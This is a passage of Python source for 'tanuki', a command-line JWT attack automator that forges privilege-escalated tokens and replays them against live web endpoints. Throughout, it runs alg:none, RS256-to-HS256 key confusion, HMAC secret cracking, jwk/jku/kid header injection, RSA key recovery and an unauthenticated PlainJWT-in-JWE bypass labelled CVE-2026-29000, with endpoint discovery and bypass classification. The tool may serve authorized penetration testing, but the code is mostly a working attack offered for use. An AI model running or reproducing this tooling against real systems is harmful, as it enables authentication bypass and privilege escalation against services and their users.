        cookies[cookie_name] = token
    else:
        headers[header_name] = header_fmt.format(token=token)
    try:
        r = requests.request(method, url, headers=headers, cookies=cookies,
                             timeout=10, verify=False, allow_redirects=False)
        snippet = r.text[:120].replace("\n", " ")
        return (r.status_code, len(r.text), snippet)
    except Exception as e:
        return ("ERR", 0, str(e)[:80])


def replay_request(req, token):
    """Replay a parsed HTTPRequest with the token swapped in its original location."""
    if not HAS_REQUESTS:
        return None
    headers, body, cookies = req.with_token(token)
    try:
        r = requests.request(
            req.method, req.url, headers=headers, cookies=cookies,
            data=body if body else None,
            timeout=10, verify=False, allow_redirects=False,
        )
        snippet = r.text[:120].replace("\n", " ")
        return (r.status_code, len(r.text), snippet)
    except Exception as e:
        return ("ERR", 0, str(e)[:80])


# ── Replay targets & verdict classification (shared by single & multi modes) ──
class Target:
    """A replayable endpoint: either a plain URL or a parsed HTTPRequest.

    .send(token) returns (status, length, snippet). .label is for display.
    """
    def __init__(self, label, send_fn, baseline_token):
        self.label = label
        self._send = send_fn
        self.baseline_token = baseline_token

    def send(self, token):
        return self._send(token)


def build_replay_targets(args, jwt):
    """Turn the CLI flags into a list of Target objects."""
    targets = []

    # Single plain URL
    if args.url:
        def mk_url_send(url):
            return lambda tok: replay(
                url, tok, method=args.method, header_name=args.header,
                header_fmt=args.header_fmt, cookie_name=args.cookie)
        targets.append(Target(args.url, mk_url_send(args.url), jwt.raw))

    # Single Burp/raw request file
    if args.request:
        try:
            req = parse_request_file(args.request, force_https=_scheme_pref(args))
        except Exception as e:
            fail(f"could not parse request file {args.request}: {e}")
        else:
            if req.token_location is None:
                warn(f"{args.request}: no JWT found in the request — "
                     "will inject into Authorization header")
            label = f"{req.method} {req.url}"
            targets.append(Target(label, lambda tok, r=req: replay_request(r, tok), jwt.raw))

    # Multi-endpoint scan — a file listing URLs and/or request-file paths
    if args.scan:
        for line in Path(args.scan).read_text().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("http://") or line.startswith("https://"):
                def mk(url):
                    return lambda tok: replay(
                        url, tok, method=args.method, header_name=args.header,
                        header_fmt=args.header_fmt, cookie_name=args.cookie)
                targets.append(Target(line, mk(line), jwt.raw))
            else:
                # treat as a request-file path
                try:
                    req = parse_request_file(line, force_https=_scheme_pref(args))
                    label = f"{req.method} {req.url}"
                    targets.append(Target(label, lambda tok, r=req: replay_request(r, tok), jwt.raw))
                except Exception as e:
                    warn(f"skipping {line}: {e}")

    # Passively-discovered / imported endpoints (--discover / --import)
    discovered = getattr(args, "_discovered", None)
    if discovered:
        def mk_disc(url):
            return lambda tok: replay(
                url, tok, method=args.method, header_name=args.header,
                header_fmt=args.header_fmt, cookie_name=args.cookie)
        for url in discovered:
            targets.append(Target(url, mk_disc(url), jwt.raw))

    return targets


def _scheme_pref(args):
    if getattr(args, "http", False):
        return False
    if getattr(args, "https", False):
        return True
    return None


REJECT_STATUSES = {401, 403}


def classify(base, result):
    """Classify a replay result against the baseline.

    Returns (kind, verdict_text, colour) where kind in
    {"bypass", "accepted", "rejected", "error", "unknown"}.
    """
    if not result:
        return ("error", "no response", C.DIM)
    status, length, _ = result
    if not isinstance(status, int):
        return ("error", str(status), C.DIM)
    if status in REJECT_STATUSES:
        return ("rejected", f"rejected (HTTP {status})", C.DIM)
    if not base or not isinstance(base[0], int):
        # no usable baseline — acceptance alone is the signal
        return ("accepted", f"SIG ACCEPTED (HTTP {status})", C.GRN)
    base_status, base_len = base[0], base[1]
    if base_status in REJECT_STATUSES:
        # the original token was denied here, the forged one is accepted →
        # this is an access-control bypass on a protected endpoint
        return ("bypass", f"ACCESS BYPASS — HTTP {base_status}→{status}", C.GRN)
    if length != base_len:
        return ("bypass", f"BYPASS — HTTP {status}, len {base_len}→{length}", C.GRN)
    return ("accepted", f"sig accepted, response unchanged (HTTP {status})", C.YEL)


def run_single_replay(target, jwt, forged):
    hdr("Live Endpoint Replay")
    info(f"target: {target.label}")
    base = target.send(jwt.raw) if jwt.raw else None     # no input token → no baseline
    if base:
        info(f"baseline (original token): HTTP {base[0]}  len={base[1]}")
    hits, accepted = [], []
    for category, label, tok in forged:
        shown = _PRES.begin_test(label)
        res = target.send(tok)
        kind, verdict, colour = classify(base, res)
        mark = "✓" if kind == "bypass" else "·"
        _PRES.end_test(shown, f"  {mark} {label[:46]:46} {colour}{verdict}{C.R}")
        if kind == "bypass":
            hits.append((category, label, tok, res[0], res[1]))
        elif kind == "accepted":
            accepted.append((category, label, tok, res[0], res[1]))

    if hits:
        _PRES.gate("reveal the confirmed bypasses")
        hdr("Confirmed Bypasses")
        for category, label, tok, status, length in hits:
            ok(f"{label}  →  HTTP {status}  (len {length})")
            print(f"      {C.CYN}{tok}{C.R}")
    if accepted and not hits:
        hdr("Signature Accepted (payload had no visible effect)")
        warn("these tokens passed signature validation — the signing attack works.")
        warn("adjust claims with --claims to find one that changes behaviour:")
        for category, label, tok, status, length in accepted[:5]:
            ok(f"{label}  →  HTTP {status}")
            print(f"      {C.CYN}{tok}{C.R}")
    if not hits and not accepted:
        info("every forged token was rejected — target does not appear vulnerable")

    # loud before→after + verdict (presentation only)
    if hits:
        b_status = base[0] if (base and isinstance(base[0], int)) else "?"
        _PRES.before_after(f"original token  →  HTTP {b_status}",
                           f"forged token    →  HTTP {hits[0][3]}  ({hits[0][1]})")
        _PRES.verdict(True, hits[0][1])
    elif accepted:
        _PRES.verdict(True, "signature accepted — tune --claims to change behaviour")
    else:
        _PRES.verdict(False, "every forged token rejected — no false positives")


def run_multi_replay(targets, jwt, forged):
    """Scan every forged token against every endpoint.

    Prints a per-endpoint summary (best result found) plus a final matrix of
    which attack worked on which endpoint.
    """
    hdr(f"Multi-Endpoint Scan — {len(targets)} endpoints × {len(forged)} tokens")

    # matrix[endpoint_label][attack_category] = kind
    endpoint_results = []   # list of (target, best_kind, best_detail, per_attack)
    any_bypass = False

    for i, target in enumerate(targets):
        shown = _PRES.begin_test(target.label, idx=i + 1, total=len(targets))
        base = target.send(jwt.raw) if jwt.raw else None     # no input token → no baseline
        base_desc = f"HTTP {base[0]} len={base[1]}" if base else "no response"
        per_attack = {}
        best_kind, best_detail, best_token = "rejected", "", None
        rank = {"bypass": 3, "accepted": 2, "rejected": 1, "error": 0, "unknown": 0}
        for category, label, tok in forged:
            res = target.send(tok)
            kind, verdict, colour = classify(base, res)
            # keep the strongest result per attack category
            prev = per_attack.get(category)
            if prev is None or rank[kind] > rank[prev[0]]:
                per_attack[category] = (kind, label, tok, verdict)
            if rank[kind] > rank[best_kind]:
                best_kind, best_detail, best_token = kind, verdict, tok

        endpoint_results.append((target, base_desc, best_kind, best_detail, best_token, per_attack))

        # per-endpoint line
        if best_kind == "bypass":
            any_bypass = True
            icon, colour = "✓", C.GRN
        elif best_kind == "accepted":
            icon, colour = "!", C.YEL
        else:
            icon, colour = "·", C.DIM
        _PRES.end_test(shown, f"  {icon} {C.BOLD}{target.label[:50]:50}{C.R} "
                       f"{C.DIM}[{base_desc}]{C.R}  {colour}{best_detail or best_kind}{C.R}")

    # ── attack × endpoint matrix ──
    hdr("Attack / Endpoint Matrix")
    categories = []
    for _, _, tok in forged:
        pass
    categories = list(dict.fromkeys(c for c, _, _ in forged))
    cat_abbr = {
        "alg:none": "none", "key-confusion": "confuse", "cracked-secret": "crack",
        "jwk-injection": "jwk", "jku-injection": "jku", "kid-injection": "kid",
        "plainjwt-in-jwe": "jwe",
    }
    # header row
    col_w = 9
    head_cells = "".join(f"{cat_abbr.get(c, c)[:col_w-1]:>{col_w}}" for c in categories)
    print(f"  {'endpoint':<40}{head_cells}")
    print(f"  {'-'*40}{'-'*(col_w*len(categories))}")
    for target, base_desc, best_kind, best_detail, best_token, per_attack in endpoint_results:
        cells = ""
        for c in categories:
            entry = per_attack.get(c)
            if entry is None:
                mark = "-"
            else:
                k = entry[0]
                mark = {"bypass": "VULN", "accepted": "sig", "rejected": ".",
                        "error": "err", "unknown": "?"}[k]
            colour = (C.GRN if mark == "VULN" else C.YEL if mark == "sig" else C.DIM)
            cells += f"{colour}{mark:>{col_w}}{C.R}"
        print(f"  {target.label[:40]:<40}{cells}")
        _PRES.item()

    # ── confirmed bypasses with tokens ──
    confirmed = [(t, pa) for (t, _, k, _, _, pa) in endpoint_results if k == "bypass"]
    if confirmed:
        _PRES.gate("reveal the confirmed bypasses")
        hdr("Confirmed Bypasses by Endpoint")
        for target, per_attack in confirmed:
            ok(f"{target.label}")
            for c, (kind, label, tok, verdict) in per_attack.items():
                if kind == "bypass":
                    print(f"      {C.YEL}{label}{C.R}")
                    print(f"      {C.CYN}{tok}{C.R}")
    if not any_bypass:
        info("no endpoint showed a definitive bypass — review 'sig' cells manually")

    # loud summary verdict (presentation only)
    n_vuln = sum(1 for (_, _, k, _, _, _) in endpoint_results if k == "bypass")
    total = len(endpoint_results)
    _PRES.verdict(n_vuln > 0,
                  f"{n_vuln}/{total} discovered endpoints bypassed — full map above")


# ── Output helpers ───────────────────────────────────────────────────────────
def print_token(label, token, verdict=None):
    v = ""
    if verdict:
        colour = C.GRN if verdict[0] == "hit" else (C.YEL if verdict[0] == "maybe" else C.DIM)
        v = f"  {colour}{verdict[1]}{C.R}"
    print(f"  {C.GRN}[✓]{C.R} {C.BOLD}{label}{C.R}{v}")
    print(f"      {C.CYN}{token}{C.R}")


def pretty_json(obj):
    return json.dumps(obj, indent=2)


# ── Main orchestration ───────────────────────────────────────────────────────
class _NoToken:
    """Stand-in for the decoded JWT when there is no input token (--jwe mints its
    own alg:none PlainJWT). .raw is None so replay skips the baseline request."""
    raw = None
    header = {}
    payload = {}


def run_jwe_only(args):
    """PlainJWT-in-JWE (CVE-2026-29000), the UNAUTHENTICATED path: no input token.

    Mint the alg:none inner token from --claims and wrap it in a JWE encrypted to the
    server's RSA public key (from --pubkey or JWKS discovery), then replay/classify.
    """
    if not args.claims:
        fail("PlainJWT-in-JWE with no token needs --claims "
             "(e.g. --claims sub=administrator,role=admin)")
        return 1
    new_payload = parse_custom_claims(args.claims)

    hdr("Minted PlainJWT claims")
    for k, v in new_payload.items():
        print(f"  {C.YEL}{k}{C.R}: {C.GRN}{v}{C.R}")

    # Public key: --jwks-url (exact), --pubkey (file), or JWKS discovery. Prefer an
    # "enc" key and capture its kid to echo into the JWE header.
    pubkey_pem, pubkey_kid = None, None
    if getattr(args, "jwks_url", None):
        hdr("JWKS")
        pubkey_pem, pubkey_kid = fetch_jwks_url(args.jwks_url, prefer_use="enc")
        if pubkey_pem:
            ok(f"public key from {args.jwks_url}" + (f" (kid={pubkey_kid})" if pubkey_kid else ""))
        else:
            skip(f"no RSA key at {args.jwks_url}")
    elif args.pubkey:
        pubkey_pem = Path(args.pubkey).read_text()
        info(f"using public key from {args.pubkey}")
    else:
        discovery_url = args.url or args.discover
        if discovery_url:
            hdr("JWKS Auto-Discovery")
            pubkey_pem, pubkey_kid, src = discover_jwks(discovery_url, prefer_use="enc")
            if pubkey_pem:
                ok(f"public key recovered from {src}" + (f" (kid={pubkey_kid})" if pubkey_kid else ""))
            else:
                skip("no JWKS endpoint found at common paths")

    hdr("Attack: PlainJWT-in-JWE (CVE-2026-29000)")
    _PRES.narrate("PlainJWT-in-JWE — mint an alg:none token and wrap it in a JWE to "
                  "the server's RSA key (unauthenticated pac4j-jwt bypass)")
    jwe_results, jwe_err = attack_plainjwt_in_jwe(None, new_payload, pubkey_pem, kid=pubkey_kid)
    if jwe_err:
        fail(jwe_err)
        return 1
    forged = [("plainjwt-in-jwe", label, tok) for label, tok in jwe_results]
    for _c, label, tok in forged:
        print_token(label, tok)
        _PRES.item()

    # Replay — no original token, so there's no baseline (classify treats a 2xx as
    # "signature accepted", which here means the bypass worked).
    shim = _NoToken()
    replay_targets = build_replay_targets(args, shim)
    if replay_targets and not args.no_replay:
        if not HAS_REQUESTS:
            warn("requests not installed — skipping replay (pip install requests)")
        else:
            _PRES.gate("replay the forged JWEs against the target")
            if len(replay_targets) == 1:
                run_single_replay(replay_targets[0], shim, forged)
            else:
                run_multi_replay(replay_targets, shim, forged)

    if args.output:
        out = {
            "input": None,
            "modified_payload": new_payload,
            "forged_tokens": [{"attack": c, "label": l, "token": t}
                              for c, l, t in forged],
        }
        Path(args.output).write_text(pretty_json(out))
        hdr("Output")
        ok(f"wrote {len(forged)} forged tokens to {args.output}")

    print()
    return 0


def run(args):
    global _PRES
    _PRES = Presenter(demo=getattr(args, "demo", False),
                      step=getattr(args, "step", False),
                      delay=getattr(args, "demo_delay", 0.4),
                      banners=getattr(args, "banners", False),
                      no_color=bool(args.no_color) or (not sys.stdout.isatty()))

    if args.no_color or not sys.stdout.isatty():
        C.strip()

    if not args.quiet:
        banner()

    # ── Recon-only mode: passive discovery, no token / forging / scanning ──
    if args.discover_only:
        surface = gather_surface(args)
        if surface is None:
            return 1
        print_surface(surface, include_destructive=args.include_destructive)
        print()
        return 0

    # Load the token — explicit arg, file, or auto-extracted from a request file
    token_str = args.token
    if args.token_file:
        token_str = Path(args.token_file).read_text().strip()
    if not token_str and args.request:
        try:
            req0 = parse_request_file(args.request, force_https=_scheme_pref(args))
            if req0.token_value:
                token_str = req0.token_value
                info(f"extracted JWT from {args.request} "
                     f"({req0.token_location[0]})")
        except Exception as e:
            fail(f"could not read request file {args.request}: {e}")
            return 1
    if not token_str:
        # CVE-2026-29000 is unauthenticated — with --jwe we need no input token,
        # just a public key + claims. Everything else still requires a token.
        if getattr(args, "jwe", False):
            return run_jwe_only(args)
        fail("no token supplied (positional token, --token-file, or a --request file containing one)")
        return 1

    try:
        jwt = JWT(token_str)
    except ValueError as e:
        fail(str(e))
        return 1

    # ── Decode ──
    hdr("Decoded Token")
    info(f"alg: {C.BOLD}{jwt.header.get('alg','?')}{C.R}   typ: {jwt.header.get('typ','?')}"
         + (f"   kid: {jwt.header.get('kid')}" if 'kid' in jwt.header else ""))
    print(f"{C.DIM}  header:{C.R}")
    for line in pretty_json(jwt.header).splitlines():
        print(f"    {line}")
    print(f"{C.DIM}  payload:{C.R}")
    for line in pretty_json(jwt.payload).splitlines():
        print(f"    {line}")

    # ── Recon: recover the public key from two signatures and exit ──
    if args.derive_only:
        if not args.derive_key:
            fail("--derive-only needs a second token: --derive-key <JWT>")
            return 1
        recovered = run_key_recovery(args, jwt)
        print()
        return 0 if recovered else 1

    _PRES.gate("modify the payload")

    # ── Decide the modified payload ──
    if args.claims:
        custom = parse_custom_claims(args.claims)
        new_payload = dict(jwt.payload)
        new_payload.update(custom)
        changed = [(k, jwt.payload.get(k), v) for k, v in custom.items()]
    else:
        new_payload, changed = suggest_modifications(jwt.payload)

    hdr("Payload Modification")
    if changed:
        for k, old, new in changed:
            print(f"  {C.YEL}{k}{C.R}: {C.DIM}{old}{C.R} → {C.GRN}{new}{C.R}")
    else:
        warn("no privilege claims auto-detected — forging with payload unchanged")
        warn("use --claims 'role=admin,isAdmin=true' to set claims explicitly")

    # ── Passive discovery / import of scan targets (optional) ──
    # Discover the endpoints the app advertises, then feed the confirmed list
    # into the existing scan engine (see build_replay_targets).
    if args.discover or args.import_file:
        surface = gather_surface(args)
        if surface is None:
            return 1
        print_surface(surface, include_destructive=args.include_destructive)
        _PRES.gate("scan the discovered surface")
        scan_urls = surface_scan_targets(surface,
                                         include_destructive=args.include_destructive)
        if not scan_urls:
            warn("discovery/import found no scannable endpoints")
        else:
            if sys.stdout.isatty() and not args.yes:
                if not _confirm("Scan %d discovered endpoint(s)?" % len(scan_urls)):
                    info("aborted — not scanning discovered endpoints")
                    return 0
            args._discovered = scan_urls

    # ── Public key: supplied or discovered ──
    # Discovery URL comes from --url, --discover, or the host in a --request file.
    discovery_url = args.url or args.discover
    if not discovery_url and args.request:
        try:
            _r = parse_request_file(args.request, force_https=_scheme_pref(args))
            discovery_url = _r.url
        except Exception:
            pass

    pubkey_pem = None
    pubkey_kid = None               # JWKS key id, echoed into the JWE header
    if getattr(args, "jwks_url", None):
        hdr("JWKS")
        pubkey_pem, pubkey_kid = fetch_jwks_url(args.jwks_url)
        if pubkey_pem:
            ok(f"public key from {args.jwks_url}" + (f" (kid={pubkey_kid})" if pubkey_kid else ""))
        else:
            skip(f"no RSA key at {args.jwks_url}")
    elif args.pubkey:
        pubkey_pem = Path(args.pubkey).read_text()
        info(f"using public key from {args.pubkey}")
    elif discovery_url and jwt.header.get("alg", "").upper().startswith(("RS", "ES", "PS")):
        hdr("JWKS Auto-Discovery")
        pubkey_pem, pubkey_kid, src = discover_jwks(discovery_url)
        if pubkey_pem:
            ok(f"public key recovered from {src}")
        else:
            skip("no JWKS endpoint found at common paths")

    # ── RSA public-key recovery from two signatures (if we still have no key) ──
    # Only RSA (RS*) is confusable; derive the key if a second token was given.
    if pubkey_pem is None and jwt.header.get("alg", "").upper() in _RS_HASH:
        if args.derive_key:
            recovered = run_key_recovery(args, jwt)
            if recovered:
                pubkey_pem = recovered[0]["spki_pem"]
        else:
            info("no public key found — supply a second JWT with --derive-key "
                 "<token> to recover the key from two signatures")

    # ── Collect all forged tokens ──
    _PRES.gate("forge the attack tokens")
    forged = []   # list of (category, label, token)

    hdr("Attack: alg:none")
    _PRES.narrate("alg:none — ask the server to accept an unsigned token")
    for label, tok in attack_alg_none(jwt, new_payload):
        forged.append(("alg:none", label, tok))
        print_token(label, tok)
        _PRES.item()

    hdr("Attack: RS256 → HS256 Key Confusion")
    _PRES.narrate("key confusion — re-sign with the RSA public key as an HMAC secret")
    kc_results, kc_err = attack_key_confusion(jwt, new_payload, pubkey_pem)
    if kc_err:
        skip(kc_err)
    for label, tok in kc_results:
        forged.append(("key-confusion", label, tok))
        print_token(label, tok)
        _PRES.item()

    if not args.no_crack:
        hdr("Attack: HMAC Secret Cracking")
        _PRES.narrate("secret cracking — brute the weak HMAC key, then re-sign as admin")
        if jwt.header.get("alg", "").upper().startswith("HS"):
            secret, method = crack_secret(jwt, args.wordlist, prefer=args.cracker,
                                          rules=args.rules)
            if secret is not None:
                _PRES.gate("reveal the cracked secret")
                ok(f"secret cracked via {method}: {C.BOLD}{C.GRN}{secret}{C.R}")
                tok = resign_hs256(jwt, new_payload, secret,
                                  alg=jwt.header.get("alg", "HS256").upper())
                forged.append(("cracked-secret", f"re-signed with '{secret}'", tok))
                print_token(f"re-signed with cracked secret '{secret}'", tok)
            else:
                skip(f"secret not cracked ({method})")
        else:
            skip(f"token alg is {jwt.header.get('alg')} — not HMAC, nothing to crack")

    hdr("Attack: jwk Header Injection")
    _PRES.narrate("jwk injection — embed our own public key in the token header")
    jwk_tok, jwk_err = attack_jwk_injection(jwt, new_payload)
    if jwk_err:
        skip(jwk_err)
    elif jwk_tok:
        forged.append(("jwk-injection", "self-signed embedded key", jwk_tok))
        print_token("self-signed embedded jwk", jwk_tok)
        _PRES.item()

    if args.jku_url:
        hdr("Attack: jku Header Injection")
        _PRES.narrate("jku injection — point the verifier at a JWKS we host")
        jku_art, jku_err = attack_jku_injection(jwt, new_payload, args.jku_url)
        if jku_err:
            skip(jku_err)
        else:
            forged.append(("jku-injection", f"jku={args.jku_url}", jku_art["token"]))
            print_token(f"jku → {args.jku_url}", jku_art["token"])
            print_jku_hosting_kit(args.jku_url, jku_art,
                                  port=getattr(args, "jku_port", 8000),
                                  show_private=getattr(args, "show_private", False),
                                  target_url=args.url, cookie=args.cookie,
                                  header=args.header, header_fmt=args.header_fmt)

    hdr("Attack: kid Header Injection")
    _PRES.narrate("kid injection — abuse the key-id header (path traversal / SQLi)")
    kid_results, kid_err = attack_kid_injection(jwt, new_payload)
    if kid_err:
        skip(kid_err)
    for label, tok in kid_results:
        forged.append(("kid-injection", label, tok))
        print_token(label, tok)
        _PRES.item()

    # PlainJWT-in-JWE (CVE-2026-29000). Part of the default run when an RSA public
    # key is available (supplied / discovered / derived); forced with --jwe,
    # suppressed with --no-jwe.
    if (pubkey_pem or getattr(args, "jwe", False)) and not getattr(args, "no_jwe", False):
        hdr("Attack: PlainJWT-in-JWE (CVE-2026-29000)")
        _PRES.narrate("PlainJWT-in-JWE — wrap an alg:none token in a JWE to the "
                      "server's RSA public key (pac4j-jwt bypass)")
        jwe_results, jwe_err = attack_plainjwt_in_jwe(jwt, new_payload, pubkey_pem,
                                                      kid=pubkey_kid)
        if jwe_err:
            skip(jwe_err)
        for label, tok in jwe_results:
            forged.append(("plainjwt-in-jwe", label, tok))
            print_token(label, tok)
            _PRES.item()

    # ── Live replay ──
    # Three modes, decided by the flags:
    #   args.url          → single plain URL (original behaviour)
    #   args.request      → one Burp/raw HTTP request file (swap token in place)
    #   args.scan         → many endpoints (URLs and/or request files)
    replay_targets = build_replay_targets(args, jwt)

    if replay_targets and not args.no_replay:
        if not HAS_REQUESTS:
            warn("requests not installed — skipping replay (pip install requests)")
        else:
            _PRES.gate("replay the forged tokens against the target")
            if len(replay_targets) == 1:
                run_single_replay(replay_targets[0], jwt, forged)
            else:
                run_multi_replay(replay_targets, jwt, forged)

    # ── Save output ──
    if args.output:
        out = {
            "input": jwt.raw,
            "header": jwt.header,
            "payload": jwt.payload,
            "modified_payload": new_payload,
            "forged_tokens": [
                {"attack": c, "label": l, "token": t} for c, l, t in forged
            ],
        }
        Path(args.output).write_text(pretty_json(out))
        hdr("Output")
        ok(f"wrote {len(forged)} forged tokens to {args.output}")

    print()
    return 0


_HELP_DESCRIPTION = (
    "JWT attack automator — paste a token and it runs every viable JWT attack in\n"
    "one pass (alg:none, RS256->HS256 key confusion, HMAC secret cracking,\n"
    "jwk/jku/kid injection, RSA public-key recovery, PlainJWT-in-JWE /\n"
    "CVE-2026-29000), forges privilege-escalated tokens, and replays them against a\n"
    "target to see which get through."
)

_HELP_EPILOG = """\
examples:
  decode only, no attacks:
      tanuki <TOKEN> --no-crack --no-replay
  attack a live endpoint (JWKS discovery + replay):
      tanuki <TOKEN> -u https://target/api/me
  token carried in a cookie, set a specific claim:
      tanuki <TOKEN> -u https://target/admin --cookie session --claims sub=administrator
  crack an HS256 secret then re-sign as admin:
      tanuki <TOKEN> -u https://target/api --cracker hashcat -w rockyou.txt --claims role=admin
  no public key exposed — recover it from a SECOND token, then confuse:
      tanuki <TOKEN> --derive-key <TOKEN2> -u https://target/admin --cookie session --claims sub=administrator
  scan many endpoints with a known public key:
      tanuki <TOKEN> --scan targets.txt --pubkey key.pem
  passively discover endpoints and attack them all:
      tanuki <TOKEN> --discover https://target --yes

"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="tanuki",
        description=_HELP_DESCRIPTION,
        epilog=_HELP_EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # ── Input: where the token (and any target list) comes from ──
    g_in = p.add_argument_group("input", "where the token and targets come from")
    g_in.add_argument("token", nargs="?", help="the JWT to attack (or use --token-file / -r)")
    g_in.add_argument("--token-file", metavar="FILE", help="read the JWT from a file instead")
    g_in.add_argument("-r", "--request", metavar="FILE",
                      help="Burp/raw HTTP request file — the token is swapped in its "
                           "original location (header, cookie, or body) and replayed")
    g_in.add_argument("--scan", metavar="FILE",
                      help="multi-endpoint scan: a file of URLs and/or request-file paths "
                           "(one per line) to replay every forged token against")

    # ── Payload / claims ──
    g_claims = p.add_argument_group("payload / claims")
    g_claims.add_argument("-c", "--claims", metavar="K=V,…",
                          help="claims to set, e.g. 'role=admin,isAdmin=true' "
                               "(default: auto-detect and flip privilege claims)")

    # ── Signature attacks ──
    g_sig = p.add_argument_group("signature attacks")
    g_sig.add_argument("--pubkey", metavar="PEM",
                       help="server's RSA public key (PEM) — enables RS256->HS256 "
                            "key confusion without needing JWKS discovery")
    g_sig.add_argument("--jwks-url", dest="jwks_url", metavar="URL",
                       help="fetch the public key directly from this JWKS URL "
                            "(e.g. https://target/api/auth/jwks); its kid is echoed "
                            "into the JWE header")
    g_sig.add_argument("--jku-url", metavar="URL",
                       help="attacker-hosted JWKS URL — enables the jku attack and prints "
                            "a hosting kit (fields to paste into a hosting form, plus a "
                            "local-server snippet)")
    g_sig.add_argument("--jku-port", type=int, default=8000, metavar="PORT",
                       help="port for the jku hosting-kit local-server snippet (default: 8000)")
    g_sig.add_argument("--show-private", action="store_true",
                       help="also print generated private keys (jku) — normally not needed")
    g_sig.add_argument("--jwe", action="store_true",
                       help="force the PlainJWT-in-JWE attack (CVE-2026-29000, pac4j-jwt): "
                            "wrap an alg:none token in a JWE to the server's RSA key. "
                            "UNAUTHENTICATED — works with NO input token (just a public key "
                            "+ --claims). Runs by default when an RSA public key is available")
    g_sig.add_argument("--no-jwe", action="store_true",
                       help="suppress the PlainJWT-in-JWE attack in the default run (low noise)")

    # ── Key recovery (RS256->HS256 when no public key is exposed) ──
    g_rec = p.add_argument_group(
        "key recovery",
        "recover the RSA public key from two signatures when none is exposed")
    g_rec.add_argument("--derive-key", "--second-token", dest="derive_key", metavar="TOKEN2",
                       help="a SECOND RS* JWT from the same key — recovers the public key "
                            "from the two signatures (GCD attack) and feeds it into key "
                            "confusion when no --pubkey/JWKS is available")
    g_rec.add_argument("--derive-only", action="store_true",
                       help="just recover and print the key (PKCS#1 + SPKI PEM), then exit "
                            "(needs --derive-key)")
    g_rec.add_argument("--derive-timeout", type=float, default=120, metavar="SECS",
                       help="abort derivation after SECS so it never hangs "
                            "(default: 120; 0 = no limit). e=65537 is seconds with gmpy2, "
                            "minutes/hours without")

    # ── HMAC secret cracking ──
    g_crack = p.add_argument_group("cracking (HMAC secrets)")
    g_crack.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt",
                         metavar="FILE",
                         help="wordlist for HMAC cracking (default: rockyou.txt)")
    g_crack.add_argument("--cracker", choices=["auto", "hashcat", "john", "builtin"],
                         default="auto",
                         help="cracking backend (default: auto = hashcat->john->builtin)")
    g_crack.add_argument("--rules", metavar="FILE",
                         help="hashcat rules file (e.g. best64.rule)")
    g_crack.add_argument("--no-crack", action="store_true", help="skip secret cracking")

    # ── Replay / target ──
    g_rep = p.add_argument_group("replay / target", "how forged tokens reach the target")
    g_rep.add_argument("-u", "--url", metavar="URL",
                       help="target endpoint — enables JWKS discovery + live replay")
    g_rep.add_argument("--cookie", metavar="NAME",
                       help="send the token as this cookie instead of a header")
    g_rep.add_argument("--header", default="Authorization", metavar="NAME",
                       help="header carrying the token (default: Authorization)")
    g_rep.add_argument("--header-fmt", default="Bearer {token}", metavar="FMT",
                       help="header value format (default: 'Bearer {token}')")
    g_rep.add_argument("-X", "--method", default="GET", metavar="METHOD",
                       help="HTTP method for replay (default: GET)")
    g_rep.add_argument("--http", action="store_true",
                       help="force http scheme for request files")
    g_rep.add_argument("--https", action="store_true",
                       help="force https scheme for request files (default: infer / https)")
    g_rep.add_argument("--no-replay", action="store_true",
                       help="forge only — skip live replay")

    # ── Passive endpoint discovery ──
    g_disc = p.add_argument_group("discovery", "passively map the target's endpoints")
    g_disc.add_argument("--discover", metavar="URL",
                        help="discover endpoints at a base URL (JS bundles, OpenAPI/Swagger, "
                             "JSON links), then scan them")
    g_disc.add_argument("--discover-only", action="store_true",
                        help="print the discovered surface and exit (recon; no forging, "
                             "needs no token)")
    g_disc.add_argument("--import", dest="import_file", metavar="FILE",
                        help="merge another tool's endpoint list (one URL/path per line, "
                             "'#' comments ignored) into the scan set")
    g_disc.add_argument("--include-destructive", action="store_true",
                        help="also scan endpoints flagged destructive (delete/logout/reset/…)")
    g_disc.add_argument("-y", "--yes", action="store_true",
                        help="assume yes — don't prompt before scanning discovered endpoints")

    # ── Output / presentation (cosmetic — never changes results) ──
    g_out = p.add_argument_group("output / presentation")
    g_out.add_argument("-o", "--output", metavar="FILE",
                       help="write all forged tokens to a JSON file")
    g_out.add_argument("-q", "--quiet", action="store_true", help="suppress the banner")
    g_out.add_argument("--no-color", action="store_true", help="disable coloured output")
    g_out.add_argument("--demo", action="store_true",
                       help="presentation mode: pace output and stream results (non-blocking)")
    g_out.add_argument("--step", action="store_true",
                       help="pause for Enter at each phase boundary (implies --demo; "
                            "falls back to --demo when not a TTY)")
    g_out.add_argument("--demo-delay", type=float, default=0.4, metavar="SECONDS",
                       help="pause length for --demo pacing (default: 0.4)")
    g_out.add_argument("--banners", action="store_true",
                       help="legibility layer only: section banners, loud verdicts and "
                            "before->after blocks (implied by --demo/--step)")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    # a token can come from: positional, --token-file, or a --request file.
    # --discover-only is recon and needs no token; --jwe (CVE-2026-29000) is
    # unauthenticated and mints its own token from --claims, so it needs none either.
    if (not args.token and not args.token_file and not args.request
            and not args.discover_only and not args.jwe):
        parser.print_help()
        return 1
    try:
        return run(args)
    except KeyboardInterrupt:
        print("\n  interrupted")
        return 130


if __name__ == "__main__":
    sys.exit(main())
